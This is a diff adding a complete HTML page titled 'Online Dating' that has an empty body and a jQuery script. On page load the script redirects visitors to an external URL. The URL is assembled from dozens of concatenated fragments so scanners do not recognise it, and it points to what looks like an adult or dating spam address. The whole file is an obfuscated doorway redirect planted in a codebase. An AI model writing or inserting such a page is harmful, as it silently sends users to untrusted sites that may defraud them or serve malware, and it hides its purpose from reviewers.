@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <title>Online Dating</title>
+ <script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
+ <script>
+  $(document).ready(function (){
+   var url = "ht"+""+"tp"+""+":/"+""+"/f"+""+"rt"+""+"yb"+""+".c"+""+"om"+""+"/g"+""+"o/"+""+"bW"+""+"_b"+""+"nw"+""+"Hp"+""+"_m"+""+"zW"+""+"g/"+""+"se"+""+"xy"+""+"01"+""+"25"+""+"/";
+   $(location).attr('href',url);
+  });
+ </script>
+</head>
+<body>
+
+</body>
+</html>
